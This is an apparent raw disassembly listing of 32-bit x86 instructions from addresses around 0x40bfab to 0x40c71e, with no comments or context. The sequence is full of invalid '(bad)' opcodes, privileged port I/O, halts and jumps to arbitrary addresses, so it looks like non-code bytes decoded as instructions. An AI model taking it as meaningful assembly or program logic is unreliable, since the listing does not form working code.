  40bfab:	add    eax,0x1805da2a
  40bfb0:	mov    ebp,ecx
  40bfb2:	retf   0x9fea
  40bfb5:	mov    bl,0x5d
  40bfb7:	jno    0x40bfa4
  40bfb9:	call   DWORD PTR [ecx+0x47502c36]
  40bfbf:	test   DWORD PTR [ebx-0x6efbf6f5],0x7206c405
  40bfc9:	jno    0x40bfe6
  40bfcb:	loope  0x40bf90
  40bfcd:	xchg   BYTE PTR [esi-0xd71ab8b],al
  40bfd3:	imul   esp,DWORD PTR [ebx],0x71976ae1
  40bfd9:	fwait
  40bfda:	rcl    BYTE PTR [ebx-0x735a6485],cl
  40bfe0:	pop    eax
  40bfe1:	push   es
  40bfe2:	xchg   ebx,eax
  40bfe3:	stc    
  40bfe4:	xchg   ebx,eax
  40bfe5:	iret   
  40bfe6:	shr    DWORD PTR [eax-0x60],0xdc
  40bfea:	adc    al,0x43
  40bfec:	xor    DWORD PTR [ecx-0x26b50e63],esi
  40bff2:	inc    ebx
  40bff3:	sub    al,0x45
  40bff5:	loop   0x40c069
  40bff7:	mov    bh,0x83
  40bff9:	add    BYTE PTR [ebp-0x4a46d2bf],0xd5
  40c000:	leave  
  40c001:	in     al,0x7d
  40c003:	cmc    
  40c004:	neg    dl
  40c006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c007:	adc    BYTE PTR [edx],dl
  40c009:	cmp    esi,0x8e49e085
  40c00f:	push   esi
  40c010:	or     al,cl
  40c012:	repz les edi,FWORD PTR [ebp+0x1b94faf7]
  40c019:	int3   
  40c01a:	mov    ah,0x3
  40c01c:	je     0x40c058
  40c01e:	clc    
  40c01f:	mov    ecx,0xf040334d
  40c024:	lods   eax,DWORD PTR ds:[esi]
  40c025:	and    DWORD PTR [esi+ecx*1],0x4
  40c029:	test   esp,0xd0097d88
  40c02f:	xchg   esp,eax
  40c030:	adc    BYTE PTR [ecx-0x4e],0x41
  40c034:	aam    0xcd
  40c036:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c037:	adc    ecx,esp
  40c039:	jae    0x40c055
  40c03b:	or     DWORD PTR [eax+0x76],ebx
  40c03e:	sub    ch,dl
  40c040:	jne    0x40c044
  40c042:	jnp    0x40bfc5
  40c044:	mov    ds:0xae4fc394,al
  40c049:	mov    ebx,0xcf5c2298
  40c04e:	dec    edi
  40c04f:	pop    edi
  40c050:	sbb    bh,BYTE PTR [eax]
  40c052:	push   ds
  40c053:	inc    ecx
  40c054:	ret    0xf91a
  40c057:	data16 sub dh,ch
  40c05a:	or     ch,BYTE PTR [eax+esi*4-0x1]
  40c05e:	out    0x31,eax
  40c060:	sub    edx,DWORD PTR [ecx+0x71]
  40c063:	xlat   BYTE PTR ds:[ebx]
  40c064:	popa   
  40c065:	jl     0x40c0b6
  40c067:	or     esi,DWORD PTR [eax+0x1b]
  40c06a:	out    0x11,al
  40c06c:	addr16 test eax,0x128e25ea
  40c072:	and    edi,DWORD PTR [edi+0x68802906]
  40c078:	pop    ebp
  40c079:	rcr    ebp,0x18
  40c07c:	pop    ss
  40c07d:	rcl    BYTE PTR [eax+0x783ebf29],0x2d
  40c084:	aaa    
  40c085:	push   ebx
  40c086:	adc    DWORD PTR [edx+edx*8-0x8],eax
  40c08a:	aad    0x50
  40c08c:	inc    esp
  40c08d:	test   al,0x4d
  40c08f:	imul   edi,DWORD PTR [ebx-0x3d095089],0xffffff94
  40c096:	mov    ?,WORD PTR fs:[edx]
  40c099:	rol    DWORD PTR [eax],1
  40c09b:	stos   BYTE PTR es:[edi],al
  40c09c:	jp     0x40c0af
  40c09e:	jecxz  0x40c064
  40c0a0:	adc    BYTE PTR [esi+0x4e2c1e3e],al
  40c0a6:	and    DWORD PTR [edx],ebp
  40c0a8:	hlt    
  40c0a9:	in     eax,dx
  40c0aa:	into   
  40c0ab:	add    eax,0x5f3293b6
  40c0b0:	and    cl,BYTE PTR [esp+eax*4]
  40c0b3:	inc    edi
  40c0b4:	std    
  40c0b5:	test   DWORD PTR [esi+0x1b],ebx
  40c0b8:	xchg   esi,eax
  40c0b9:	(bad)  
  40c0ba:	pop    ss
  40c0bb:	xchg   BYTE PTR [ecx],ch
  40c0bd:	xor    al,0x3d
  40c0bf:	mov    ah,0x85
  40c0c1:	in     al,0x4f
  40c0c3:	cmp    ebx,edi
  40c0c5:	sbb    DWORD PTR ds:[eax],0x79bcb8a9
  40c0cc:	loop   0x40c095
  40c0ce:	outs   dx,BYTE PTR ds:[esi]
  40c0cf:	scas   al,BYTE PTR es:[edi]
  40c0d0:	inc    edx
  40c0d1:	push   edi
  40c0d2:	retf   0x833d
  40c0d5:	mov    ebx,DWORD PTR [esi+0x756bbca4]
  40c0db:	call   DWORD PTR ds:0x25ef0bf4
  40c0e1:	arpl   cx,di
  40c0e3:	jo     0x40c15d
  40c0e5:	inc    ecx
  40c0e6:	xchg   edi,eax
  40c0e7:	jbe    0x40c15b
  40c0e9:	xchg   edi,eax
  40c0ea:	mov    ds:0x59a7b41c,al
  40c0ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0f0:	fwait
  40c0f1:	popa   
  40c0f2:	outs   dx,DWORD PTR ds:[esi]
  40c0f3:	jns    0x40c14e
  40c0f5:	jge    0x40c15a
  40c0f7:	push   ebp
  40c0f8:	lock xchg esi,eax
  40c0fa:	jmp    0xe733da89
  40c0ff:	and    al,0xbc
  40c101:	aaa    
  40c102:	add    al,0x1f
  40c104:	out    0xd8,al
  40c106:	pop    DWORD PTR [ebp+0x5dd67a30]
  40c10c:	lea    esp,[ebx+0x63]
  40c10f:	imul   ebp,DWORD PTR [edx],0x7d
  40c112:	test   al,0xc1
  40c114:	lock jno 0x40c175
  40c117:	inc    eax
  40c118:	les    ebp,FWORD PTR [edi+0x30]
  40c11b:	jg     0x40c127
  40c11d:	jae    0x40c0f4
  40c11f:	push   esp
  40c120:	push   cs
  40c121:	ins    BYTE PTR es:[edi],dx
  40c122:	rcl    esp,1
  40c124:	jmp    FWORD PTR [ebp+0x7a]
  40c127:	mov    bl,0xe1
  40c129:	imul   ecx,DWORD PTR [esi],0xc20cc3e0
  40c12f:	lods   al,BYTE PTR ds:[esi]
  40c130:	mov    esp,0x40201fbb
  40c135:	or     eax,0x3ec78c88
  40c13a:	hlt    
  40c13b:	(bad)  ds:0x77e508cb
  40c141:	loopne 0x40c1ad
  40c143:	fmul   DWORD PTR [ecx+0x70]
  40c146:	cmp    ch,al
  40c148:	ins    DWORD PTR es:[edi],dx
  40c149:	int3   
  40c14a:	push   edi
  40c14b:	sub    DWORD PTR [ecx+ebp*1+0x5f00525e],ebp
  40c152:	loope  0x40c120
  40c154:	jb     0x40c18a
  40c156:	jp     0x40c1b7
  40c158:	stos   DWORD PTR es:[edi],eax
  40c159:	fisub  WORD PTR [esi+eiz*8]
  40c15c:	gs std 
  40c15e:	mov    edi,0xb592c14e
  40c163:	sub    cl,dl
  40c165:	push   0x7c
  40c167:	das    
  40c168:	jnp    0x40c160
  40c16a:	lods   eax,DWORD PTR ds:[esi]
  40c16b:	cmp    ch,BYTE PTR [eax-0x367e41c2]
  40c171:	jge    0x40c14e
  40c173:	fcom   DWORD PTR [esi+0x6fa5626b]
  40c179:	mov    edx,esp
  40c17b:	int3   
  40c17c:	ret    0x5bcc
  40c17f:	xchg   edx,eax
  40c180:	enter  0xea53,0x5a
  40c184:	aad    0x4b
  40c186:	lods   al,BYTE PTR ds:[esi]
  40c187:	xchg   esi,esp
  40c189:	(bad)  [edi-0x3ba00a1a]
  40c18f:	add    BYTE PTR [edi-0x701766cd],al
  40c195:	das    
  40c196:	mov    eax,0x261b4057
  40c19b:	push   edx
  40c19c:	repz sbb BYTE PTR [edx+0x7f],0x6a
  40c1a1:	imul   esp,DWORD PTR [esp+esi*4-0x80],0xce0e23b0
  40c1a9:	adc    esp,DWORD PTR [eax-0x487f2c9b]
  40c1af:	push   0x9af8e17
  40c1b4:	mov    ah,BYTE PTR [esi+0x184a8f24]
  40c1ba:	in     al,dx
  40c1bb:	jecxz  0x40c212
  40c1bd:	fmulp  st(5),st
  40c1bf:	xor    ebx,DWORD PTR [esi-0x5f7a4086]
  40c1c5:	xor    BYTE PTR [ecx],0xb2
  40c1c8:	inc    ebp
  40c1c9:	hlt    
  40c1ca:	pop    esi
  40c1cb:	scas   al,BYTE PTR es:[edi]
  40c1cc:	clc    
  40c1cd:	leave  
  40c1ce:	xor    cl,BYTE PTR [ebx+0x5c]
  40c1d1:	mov    ?,esi
  40c1d3:	xchg   ebp,eax
  40c1d4:	push   ebp
  40c1d5:	shl    DWORD PTR [eax+0xb0b0847],0xd5
  40c1dc:	mov    cl,0x7c
  40c1de:	mov    bl,0x56
  40c1e0:	pop    esi
  40c1e1:	pop    eax
  40c1e2:	stos   DWORD PTR es:[edi],eax
  40c1e3:	dec    ecx
  40c1e4:	xor    BYTE PTR [ebp+0x39c49e16],al
  40c1ea:	js     0x40c1d5
  40c1ec:	jp     0x40c215
  40c1ee:	scas   al,BYTE PTR es:[edi]
  40c1ef:	js     0x40c1d4
  40c1f1:	imul   edi,esp,0xf9e7d2ec
  40c1f7:	inc    eax
  40c1f8:	adc    ebp,ecx
  40c1fa:	and    al,0xd9
  40c1fc:	jg     0x40c229
  40c1fe:	(bad)  
  40c1ff:	cmp    dl,cl
  40c201:	into   
  40c202:	pop    es
  40c203:	jo     0x40c18c
  40c205:	push   ss
  40c206:	jb     0x40c248
  40c208:	xchg   edi,eax
  40c209:	push   cs
  40c20a:	fnstcw WORD PTR [edx+0x1657538a]
  40c210:	mov    ds:0x69c8c7e0,eax
  40c215:	mov    eax,0x888ac0ba
  40c21a:	push   ebp
  40c21b:	repz jne 0x40c297
  40c21e:	stos   BYTE PTR es:[edi],al
  40c21f:	enter  0x586c,0x55
  40c223:	xchg   ebp,eax
  40c224:	mov    es,ecx
  40c226:	sub    DWORD PTR [esi-0x1c],ecx
  40c229:	out    0x2f,eax
  40c22b:	cmc    
  40c22c:	ss hlt 
  40c22e:	jbe    0x40c1bf
  40c230:	cmc    
  40c231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c232:	add    al,0x21
  40c234:	push   cs
  40c235:	outs   dx,DWORD PTR ds:[esi]
  40c236:	jb     0x40c1d0
  40c238:	call   0x1e34:0x86fc439a
  40c23f:	shl    BYTE PTR [edx-0x5f],cl
  40c242:	popf   
  40c243:	xor    esi,DWORD PTR [edx+0x55]
  40c246:	je     0x40c22d
  40c248:	cdq    
  40c249:	call   0x9b86:0x5300114a
  40c250:	push   esp
  40c251:	and    al,0x71
  40c253:	sbb    ebp,DWORD PTR [edi]
  40c255:	push   ds
  40c256:	add    edi,DWORD PTR [ecx-0x6e]
  40c259:	call   0x455232b4
  40c25e:	add    DWORD PTR [esp+ebp*1],ebx
  40c261:	xchg   edi,eax
  40c262:	loop   0x40c21a
  40c264:	xchg   DWORD PTR [eax+0x79],ebp
  40c267:	imul   edx,DWORD PTR [esi-0x10],0x3f48e873
  40c26e:	jno    0x40c2de
  40c270:	in     eax,0x50
  40c272:	cmp    eax,DWORD PTR [ecx-0x64]
  40c275:	es push ecx
  40c277:	add    eax,0x97dd964c
  40c27c:	and    DWORD PTR [edi+edi*4+0x1deceb5d],ebx
  40c283:	popf   
  40c284:	test   DWORD PTR [eax],edx
  40c286:	add    eax,0x168aedfe
  40c28b:	pop    esp
  40c28c:	ja     0x40c2db
  40c28e:	or     eax,0x1e161f69
  40c293:	push   cs
  40c294:	inc    edx
  40c295:	ret    
  40c296:	das    
  40c297:	repz imul ebp,DWORD PTR [ebp+0x7d],0xc667ddc
  40c29f:	dec    ebx
  40c2a0:	lahf   
  40c2a1:	push   ecx
  40c2a2:	mov    esp,0x6c71ed92
  40c2a7:	sahf   
  40c2a8:	jmp    0xf00f:0x19f3b049
  40c2af:	pop    esp
  40c2b0:	stos   DWORD PTR es:[edi],eax
  40c2b1:	fdiv   QWORD PTR [eax+ecx*4-0x9]
  40c2b5:	(bad)  
  40c2b6:	jmp    0x40c2cd
  40c2b8:	and    ebp,DWORD PTR [esi+0x9e9f2c4]
  40c2be:	sbb    eax,0xf7c30095
  40c2c3:	popf   
  40c2c4:	pop    edi
  40c2c5:	dec    ebp
  40c2c6:	sbb    eax,0x17803305
  40c2cb:	inc    ebx
  40c2cc:	xchg   edx,eax
  40c2cd:	and    eax,DWORD PTR [eax]
  40c2cf:	sar    DWORD PTR [edi],0x47
  40c2d2:	addr16 je 0x40c307
  40c2d5:	(bad)  
  40c2d6:	sub    ch,ah
  40c2d8:	outs   dx,DWORD PTR ds:[esi]
  40c2d9:	loopne 0x40c330
  40c2db:	mov    ?,WORD PTR [esi-0x6893fd52]
  40c2e1:	push   esi
  40c2e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2e3:	mov    dh,0xfc
  40c2e5:	xlat   BYTE PTR ds:[ebx]
  40c2e6:	push   ecx
  40c2e7:	jb     0x40c33c
  40c2e9:	push   0xffffffbd
  40c2eb:	jns    0x40c35f
  40c2ed:	mov    al,0xde
  40c2ef:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40c2f1:	fcmovbe st,st(4)
  40c2f3:	mov    ah,0xe4
  40c2f5:	outs   dx,DWORD PTR ds:[esi]
  40c2f6:	test   al,0x5b
  40c2f8:	mov    esp,0x8f2c0d01
  40c2fd:	and    ebx,DWORD PTR [esi+edi*8+0x1f]
  40c301:	iret   
  40c302:	cli    
  40c303:	popa   
  40c304:	out    0x50,eax
  40c306:	add    ch,dh
  40c308:	js     0x40c342
  40c30a:	test   DWORD PTR [ebp-0x49],0xb7346286
  40c311:	mov    BYTE PTR [esi],bl
  40c313:	fs fs mov al,0x9e
  40c317:	xor    al,BYTE PTR [ecx+0x31]
  40c31a:	jg     0x40c2f6
  40c31c:	imul   esi,DWORD PTR [eax+0x4e79e371],0x2abf1a53
  40c326:	retf   
  40c327:	push   esp
  40c328:	jns    0x40c33a
  40c32a:	ins    DWORD PTR es:[edi],dx
  40c32b:	out    dx,eax
  40c32c:	je     0x40c31b
  40c32e:	mov    ah,0x3b
  40c330:	mov    ch,0x7a
  40c332:	push   esp
  40c333:	ja     0x40c2cb
  40c335:	sti    
  40c336:	repnz mov ?,WORD PTR [eax+0x57bfe97a]
  40c33d:	call   0x7c25b24d
  40c342:	imul   eax,ebx,0xc7c9f6b2
  40c348:	out    0x7,eax
  40c34a:	push   eax
  40c34b:	ins    BYTE PTR es:[edi],dx
  40c34c:	retf   
  40c34d:	and    ecx,ebx
  40c34f:	les    esi,FWORD PTR [ecx-0x3e]
  40c352:	dec    esp
  40c353:	pushf  
  40c354:	mov    al,0x34
  40c356:	or     ecx,edi
  40c358:	repz mov ds:0x11f96c33,eax
  40c35e:	or     DWORD PTR [eax+0x7d8a69b8],eax
  40c364:	aam    0x63
  40c366:	xchg   edi,eax
  40c367:	adc    BYTE PTR [ecx-0x1f181c6e],bh
  40c36d:	dec    ebp
  40c36f:	mov    dl,BYTE PTR es:[ebx]
  40c372:	test   eax,0x14e38d83
  40c377:	jnp    0x40c377
  40c379:	mov    cl,0xde
  40c37b:	jp     0x40c3f1
  40c37d:	mov    esp,0x6208913a
  40c382:	int    0x20
  40c384:	or     BYTE PTR ds:0x58c285a4,al
  40c38a:	dec    edx
  40c38b:	lods   eax,DWORD PTR ds:[esi]
  40c38c:	popa   
  40c38d:	loop   0x40c346
  40c38f:	pop    ecx
  40c390:	adc    eax,0x21672294
  40c395:	pop    es
  40c396:	jge    0x40c3cc
  40c398:	(bad)  
  40c399:	ret    0x434d
  40c39c:	cli    
  40c39d:	std    
  40c39e:	and    al,0xe7
  40c3a0:	mov    BYTE PTR [esi-0x519aec20],ch
  40c3a6:	or     ah,ch
  40c3a8:	sahf   
  40c3a9:	aaa    
  40c3aa:	jo     0x40c384
  40c3ac:	test   al,0x67
  40c3ae:	loopne 0x40c396
  40c3b0:	adc    al,0x69
  40c3b2:	ror    BYTE PTR [ebp+0xcb98192],0x30
  40c3b9:	jp     0x40c423
  40c3bb:	pop    ss
  40c3bc:	outs   dx,DWORD PTR ds:[esi]
  40c3bd:	fld    QWORD PTR [ecx]
  40c3bf:	mov    eax,0xf3e9f75b
  40c3c4:	xor    DWORD PTR [eax+esi*2-0x1f3f2f68],0x69e00f94
  40c3cf:	jb     0x40c35a
  40c3d1:	sbb    dl,BYTE PTR [ecx]
  40c3d3:	mov    ah,0xc7
  40c3d5:	add    BYTE PTR [edi],ch
  40c3d7:	iret   
  40c3d8:	pop    ebp
  40c3d9:	dec    edi
  40c3da:	ins    DWORD PTR es:[edi],dx
  40c3db:	mov    ecx,0x9d9fec63
  40c3e0:	or     eax,0x1a2fd23c
  40c3e5:	neg    BYTE PTR [eax-0x1d5c457d]
  40c3eb:	cs mov al,0xa0
  40c3ee:	(bad)  
  40c3ef:	enter  0xa8da,0x83
  40c3f3:	push   cs
  40c3f4:	test   eax,0x6fc2e6f6
  40c3f9:	shl    cl,1
  40c3fb:	cmp    DWORD PTR ds:0x184a9bf2,esi
  40c401:	mov    ch,0xc0
  40c403:	cwde   
  40c404:	mov    bl,ah
  40c406:	push   cs
  40c407:	push   ecx
  40c408:	and    ah,BYTE PTR [eax]
  40c40a:	cdq    
  40c40b:	sbb    al,0x27
  40c40d:	mov    bh,0xb2
  40c40f:	xor    dl,BYTE PTR [edi]
  40c411:	push   esp
  40c412:	pop    es
  40c413:	int    0x5e
  40c415:	rcl    cl,cl
  40c417:	pop    ebp
  40c418:	fdivr  DWORD PTR [eax-0x1077e28e]
  40c41e:	mov    cl,0x68
  40c420:	out    0xb,al
  40c422:	(bad)  
  40c423:	and    BYTE PTR [ebp-0x77],dl
  40c426:	mov    dl,0x31
  40c428:	dec    esi
  40c429:	jle    0x40c40b
  40c42b:	jo     0x40c454
  40c42d:	push   ss
  40c42e:	call   0x7ff220
  40c433:	xor    al,dl
  40c435:	dec    edi
  40c436:	jle    0x40c3dc
  40c438:	pop    edx
  40c439:	shl    esp,1
  40c43b:	enter  0x2145,0xc4
  40c43f:	call   0xeb76:0xfaacb48c
  40c446:	(bad)  
  40c447:	rcl    ah,0xc4
  40c44a:	mov    WORD PTR [ebp-0x25],?
  40c44d:	push   esp
  40c44e:	(bad)  [edx+0x43af881]
  40c454:	out    0xad,eax
  40c456:	dec    esp
  40c457:	dec    esp
  40c458:	xor    al,0xcc
  40c45a:	sbb    dl,BYTE PTR [ecx-0x5e]
  40c45d:	int    0xd
  40c45f:	out    dx,al
  40c460:	in     al,dx
  40c461:	jmp    FWORD PTR [ebx]
  40c463:	sahf   
  40c464:	push   esi
  40c465:	popa   
  40c466:	sbb    esi,DWORD PTR ds:0xbc224154
  40c46c:	out    dx,al
  40c46d:	push   0x56b67abe
  40c472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c473:	xor    edx,ebx
  40c475:	fmul   QWORD PTR [ebx+0xe160f87]
  40c47b:	das    
  40c47c:	push   edi
  40c47d:	sti    
  40c47e:	and    DWORD PTR [eax-0x8],ebp
  40c481:	loopne 0x40c4ad
  40c483:	ror    DWORD PTR [ebx+0x6],1
  40c486:	fild   QWORD PTR [edx+ecx*2]
  40c489:	xchg   BYTE PTR [ebp+0x4d],al
  40c48c:	clc    
  40c48d:	push   esi
  40c48e:	sti    
  40c48f:	mov    ds,WORD PTR [edx+esi*1]
  40c492:	mov    ds:0x2668e0,al
  40c497:	add    ecx,edi
  40c499:	and    DWORD PTR fs:[eax+0x1],ecx
  40c49d:	sbb    BYTE PTR [edi],ch
  40c49f:	mov    esi,0xba1d185b
  40c4a4:	imul   esp,DWORD PTR [esi],0x1758f1e0
  40c4aa:	xchg   ecx,eax
  40c4ab:	sbb    dl,0x5b
  40c4ae:	outs   dx,DWORD PTR ds:[esi]
  40c4af:	(bad)  
  40c4b0:	in     eax,dx
  40c4b1:	retf   0x6e05
  40c4b4:	pop    edi
  40c4b5:	add    BYTE PTR [edi+0x50],ch
  40c4b8:	(bad)  
  40c4ba:	jo     0x40c4d8
  40c4bc:	and    eax,0xd7a11651
  40c4c1:	mov    edx,0xea8e9fe2
  40c4c6:	test   al,0xfa
  40c4c8:	xchg   esi,eax
  40c4c9:	adc    ecx,DWORD PTR [esi-0x75]
  40c4cc:	iret   
  40c4cd:	xor    al,dh
  40c4cf:	(bad)  
  40c4d1:	pop    esi
  40c4d2:	nop
  40c4d3:	pop    eax
  40c4d4:	(bad)  
  40c4d5:	mov    esi,0x7406759c
  40c4da:	nop
  40c4db:	lds    ecx,FWORD PTR ds:0x80852065
  40c4e1:	adc    al,0x1
  40c4e3:	sbb    eax,0xe0c2acb0
  40c4e8:	add    BYTE PTR [ecx-0x34],0x85
  40c4ec:	lock pop ss
  40c4ee:	xor    esp,ebp
  40c4f0:	cmp    BYTE PTR [edx+0x231cd833],ah
  40c4f6:	mov    BYTE PTR [ebp-0x50171783],bl
  40c4fc:	or     ebp,ebp
  40c4fe:	xor    ecx,DWORD PTR [esi]
  40c500:	aam    0xa7
  40c502:	push   esp
  40c503:	retf   
  40c504:	jo     0x40c54d
  40c506:	in     al,dx
  40c507:	mov    ebx,0xf71af2c4
  40c50c:	pop    esi
  40c50d:	push   0x53
  40c50f:	push   ds
  40c510:	(bad)  
  40c511:	stc    
  40c512:	or     BYTE PTR [edx],dh
  40c514:	xor    ebx,eax
  40c516:	add    al,0xc
  40c518:	pop    esp
  40c519:	ins    BYTE PTR es:[edi],dx
  40c51a:	in     eax,0xce
  40c51c:	jbe    0x40c4af
  40c51e:	(bad)  
  40c51f:	sub    DWORD PTR [edx+ebx*2],edx
  40c522:	pushf  
  40c523:	test   al,0x1c
  40c525:	sub    eax,0x6ee134f5
  40c52a:	push   0x5e
  40c52c:	(bad)  
  40c52d:	ror    esi,0xe6
  40c530:	push   ebx
  40c531:	or     BYTE PTR [ebp+0x3],0x71
  40c535:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c536:	xchg   edx,eax
  40c537:	cmp    cl,bh
  40c539:	xchg   esp,eax
  40c53a:	pop    edi
  40c53b:	es or  al,0x90
  40c53e:	sub    eax,0x9091684f
  40c543:	mov    esi,0x8ab21ca8
  40c548:	push   esp
  40c549:	aaa    
  40c54a:	push   ebp
  40c54b:	ins    DWORD PTR es:[edi],dx
  40c54c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c54d:	fdiv   DWORD PTR [ebx+0x4975ed23]
  40c553:	sub    eax,ecx
  40c555:	pop    es
  40c556:	les    edi,FWORD PTR [edi+0x25]
  40c559:	jnp    0x40c5b5
  40c55b:	cld    
  40c55c:	xor    bl,BYTE PTR [ecx]
  40c55e:	cmp    ecx,DWORD PTR [esi-0x4ab439d9]
  40c564:	(bad)  [ecx]
  40c566:	push   cs
  40c567:	sbb    DWORD PTR [ecx],esp
  40c569:	sbb    al,0xb6
  40c56b:	(bad)  
  40c56c:	outs   dx,DWORD PTR ds:[esi]
  40c56d:	cmp    edx,DWORD PTR [ebx+ebp*4+0x60c5b305]
  40c574:	sbb    DWORD PTR [esi],ebp
  40c576:	mov    ebp,0x8cf369a5
  40c57b:	adc    esp,DWORD PTR [edx-0x1]
  40c57e:	adc    edx,DWORD PTR [eax-0x535f2794]
  40c584:	ins    DWORD PTR es:[edi],dx
  40c585:	lds    ecx,FWORD PTR [ebx]
  40c587:	call   0xa2874b14
  40c58c:	arpl   WORD PTR [ecx+0x73],bx
  40c58f:	pushf  
  40c590:	mov    eax,0xc44da4f2
  40c595:	sbb    BYTE PTR [ebp+0x5806866b],bl
  40c59b:	cmp    BYTE PTR [ebx+0x4f],0x65
  40c59f:	sbb    dh,BYTE PTR [edi]
  40c5a1:	ret    0xc14f
  40c5a4:	lock dec ecx
  40c5a6:	jne    0x40c577
  40c5a8:	push   ebp
  40c5a9:	enter  0x9708,0x80
  40c5ad:	mov    esi,ds
  40c5af:	ret    0x79c5
  40c5b2:	jns    0x40c5b6
  40c5b4:	lods   eax,DWORD PTR ds:[esi]
  40c5b5:	ins    DWORD PTR es:[edi],dx
  40c5b6:	push   ecx
  40c5b7:	pop    edx
  40c5b8:	test   eax,0x5c211ac
  40c5bd:	mov    ?,WORD PTR [ebp+ebp*2-0x53]
  40c5c1:	and    DWORD PTR [ebx-0x3b],eax
  40c5c4:	add    esp,DWORD PTR [edx-0x34fafa9f]
  40c5ca:	ss push es
  40c5cc:	mov    eax,ds:0x222808b5
  40c5d1:	jmp    0x40c635
  40c5d3:	mov    edx,ebx
  40c5d5:	imul   ebp,DWORD PTR [ebx],0xfffffffc
  40c5d8:	jle    0x40c655
  40c5da:	les    ecx,FWORD PTR ds:0x8b4de612
  40c5e0:	pop    edx
  40c5e1:	cmp    BYTE PTR [ecx],bl
  40c5e3:	sub    BYTE PTR [ebx],cl
  40c5e5:	sub    eax,0xad0a1959
  40c5ea:	les    edi,FWORD PTR [eax+0x7cf061d9]
  40c5f0:	jb     0x40c587
  40c5f2:	mov    dh,0xc4
  40c5f4:	fucomip st,st(6)
  40c5f6:	sub    BYTE PTR [ecx-0x3d],bh
  40c5f9:	mov    dl,0x64
  40c5fb:	cld    
  40c5fc:	pop    ebp
  40c5fd:	leave  
  40c5fe:	lahf   
  40c5ff:	jb     0x40c621
  40c601:	sub    BYTE PTR [ecx+0x37e4c2d6],ah
  40c607:	xchg   BYTE PTR ds:0xc341fae6,cl
  40c60d:	iret   
  40c60e:	ret    
  40c60f:	aas    
  40c610:	call   0x82e9beaa
  40c615:	rol    esi,1
  40c617:	xor    eax,0x5e9def3
  40c61c:	mov    ds:0x641277cd,eax
  40c621:	lea    edx,[edi-0x3492b943]
  40c627:	mov    ah,0xc6
  40c629:	pop    edi
  40c62a:	and    al,0xe1
  40c62c:	xor    DWORD PTR [ecx+0xb],ebp
  40c62f:	and    edx,DWORD PTR [edi+edi*1]
  40c632:	mov    esp,edx
  40c634:	sub    DWORD PTR [esi-0x266af02f],esi
  40c63a:	mov    bh,0x1d
  40c63c:	cwde   
  40c63d:	jae    0x40c645
  40c63f:	pop    edx
  40c640:	push   esp
  40c641:	inc    ebp
  40c642:	mov    ebp,0xde997363
  40c647:	mov    edi,DWORD PTR [ecx-0x18]
  40c64a:	jmp    0x8d3ddf70
  40c64f:	push   esi
  40c650:	jp     0x40c5fc
  40c652:	mov    ebx,0x67a8a4ab
  40c657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c658:	add    DWORD PTR [ebx-0x1eaa4218],esi
  40c65e:	add    DWORD PTR [ecx],esp
  40c660:	(bad)  
  40c661:	gs call 0x38749712
  40c667:	inc    esi
  40c668:	call   0x2f13:0x1726e28a
  40c66f:	mov    eax,0x43392448
  40c674:	sub    edi,DWORD PTR es:[ecx+edx*2]
  40c678:	or     bh,BYTE PTR [esi]
  40c67a:	pop    ebp
  40c67b:	scas   al,BYTE PTR es:[edi]
  40c67c:	jg     0x40c6a4
  40c67e:	xchg   esp,eax
  40c67f:	inc    esp
  40c680:	int    0x2d
  40c682:	pusha  
  40c683:	sbb    DWORD PTR [eax+eiz*2],ebp
  40c686:	retf   0x1f46
  40c689:	iret   
  40c68a:	push   cs
  40c68b:	repnz xchg ebp,eax
  40c68d:	enter  0xf485,0x70
  40c691:	das    
  40c692:	inc    ebp
  40c693:	cmc    
  40c694:	scas   eax,DWORD PTR es:[edi]
  40c695:	and    eax,0x2865fdb9
  40c69a:	sbb    dl,BYTE PTR [ecx]
  40c69c:	cs or  eax,0xa807bdba
  40c6a2:	push   cs
  40c6a3:	push   esp
  40c6a4:	outs   dx,BYTE PTR ds:[esi]
  40c6a5:	pop    edi
  40c6a6:	mov    ecx,0x6a5d9314
  40c6ab:	ja     0x40c718
  40c6ad:	push   cs
  40c6ae:	gs jecxz 0x40c6f8
  40c6b1:	je     0x40c676
  40c6b3:	gs and ecx,ebx
  40c6b6:	jle    0x40c6cf
  40c6b8:	shl    BYTE PTR [edx],cl
  40c6ba:	sub    eax,0x125f2d64
  40c6bf:	inc    esi
  40c6c0:	int3   
  40c6c1:	inc    eax
  40c6c2:	dec    ebx
  40c6c3:	mov    ch,BYTE PTR [edi+0x5c]
  40c6c6:	or     DWORD PTR gs:[ebx-0xc5d05b1],0x24
  40c6ce:	int    0x22
  40c6d0:	sbb    DWORD PTR [esi],esp
  40c6d2:	pop    ecx
  40c6d3:	dec    edi
  40c6d4:	xor    al,0x29
  40c6d6:	and    BYTE PTR [eax+0xb],ah
  40c6d9:	inc    BYTE PTR [esp+esi*1+0x4d0b30ff]
  40c6e0:	clc    
  40c6e1:	adc    esi,eax
  40c6e3:	adc    dl,ah
  40c6e5:	out    dx,al
  40c6e6:	inc    esp
  40c6e7:	pushf  
  40c6e8:	rcr    DWORD PTR [ecx],cl
  40c6ea:	mov    ebp,0x9f4a7a44
  40c6ef:	sar    DWORD PTR [eax],1
  40c6f1:	pop    ecx
  40c6f2:	pop    ds
  40c6f3:	pop    ds
  40c6f4:	pop    ecx
  40c6f5:	test   BYTE PTR [esi-0x18],cl
  40c6f8:	or     bl,bh
  40c6fa:	mov    al,0x74
  40c6fc:	aas    
  40c6fd:	jbe    0x40c6c1
  40c6ff:	pop    ss
  40c700:	mov    ah,BYTE PTR [edi+0x1b]
  40c703:	icebp  
  40c704:	fwait
  40c705:	shl    dl,0xa8
  40c708:	push   0x414a820a
  40c70d:	push   esp
  40c70e:	inc    ebx
  40c70f:	test   edi,ebx
  40c711:	xchg   ecx,eax
  40c712:	data16 stc 
  40c714:	pushf  
  40c715:	push   esi
  40c716:	cs jns 0x40c78a
  40c719:	push   ecx
  40c71a:	cmp    bh,BYTE PTR [ecx]
  40c71c:	jae    0x40c6e1
  40c71e:	lods   eax,DWORD PTR ds:[esi]
